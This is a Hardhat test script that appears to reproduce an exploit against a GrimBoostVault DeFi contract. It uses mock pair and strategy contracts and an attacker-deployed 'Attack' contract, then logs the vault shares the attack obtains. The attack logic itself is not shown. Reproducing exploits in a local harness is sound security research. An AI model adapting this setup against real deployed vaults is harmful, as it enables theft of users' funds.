/** @format */

const { ethers } = require('hardhat');

describe('Exploit', async () => {
  let vault, pair, strategy, attack;
  let admin, attacker;

  beforeEach(async () => {
    [admin, attacker] = await ethers.getSigners();

    let Pair = await ethers.getContractFactory('MockPair');
    pair = await Pair.connect(admin).deploy();

    let Strategy = await ethers.getContractFactory('MockStrategy');
    strategy = await Strategy.connect(admin).deploy(
      pair.address,
      '0x0000000000000000000000000000000000000000',
      admin.address
    );

    let Vault = await ethers.getContractFactory('GrimBoostVault');
    vault = await Vault.connect(admin).deploy(strategy.address, 'GB', 'GB', 0);

    await strategy.connect(admin).setVault(vault.address);

    let Attack = await ethers.getContractFactory('Attack');
    attack = await Attack.connect(attacker).deploy(pair.address, vault.address);

    await pair.connect(admin).mint(attack.address, 1000);
    await pair.connect(admin).mint(vault.address, 1000);
  });

  it('Exploit 1', async () => {
    await attack.connect(attacker).start(1000);

    console.log(parseInt(await vault.balanceOf(attack.address)));
  });
});
